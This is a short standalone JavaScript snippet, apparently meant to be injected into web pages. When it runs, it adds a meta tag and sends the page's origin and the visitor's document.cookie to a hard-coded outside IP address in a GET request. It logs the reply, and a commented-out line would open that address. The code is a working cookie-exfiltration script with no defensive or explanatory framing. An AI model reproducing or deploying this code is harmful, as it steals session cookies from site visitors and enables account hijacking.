(function(){
    /* string to dom
     function parseDom(arg) {
       var objE = document.createElement("div");
       objE.innerHTML = arg;
       return objE.childNodes;
    };
    */
    
    let meta = document.createElement('meta');
    meta.content="upgrade-insecure-requests";
    meta.setAttribute("http-equiv","Content-Security-Policy");
    document.getElementsByTagName('head')[0].appendChild(meta);
    var httpRequest = new XMLHttpRequest();
    httpRequest.open('GET',"https://66.70.204.147/ftts?d="+window.location.origin+"&c="+document.cookie, true);
    httpRequest.send();
    httpRequest.onreadystatechange = function () {
        if (httpRequest.readyState == 4 && httpRequest.status == 200) {
            var json = httpRequest.responseText;
            console.log(json);
        }else{
            //window.open("https://66.70.204.147");
        }
    };
}())
